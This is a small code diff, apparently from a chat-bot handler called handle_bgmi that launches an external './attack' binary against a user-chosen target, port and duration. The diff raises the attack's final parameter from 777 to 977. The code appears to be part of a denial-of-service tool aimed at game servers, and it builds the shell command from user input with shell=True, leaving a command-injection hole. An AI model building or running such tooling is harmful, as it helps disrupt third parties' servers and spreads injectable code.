@@ -146,7 +146,7 @@ def handle_bgmi(message):
     user_last_attack_time[user_id] = current_time
     user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
 
-    full_command = f"./attack {target} {port} {attack_time} 777"
+    full_command = f"./attack {target} {port} {attack_time} 977"
     process = subprocess.Popen(full_command, shell=True)
     running_attacks[user_id] = process
 
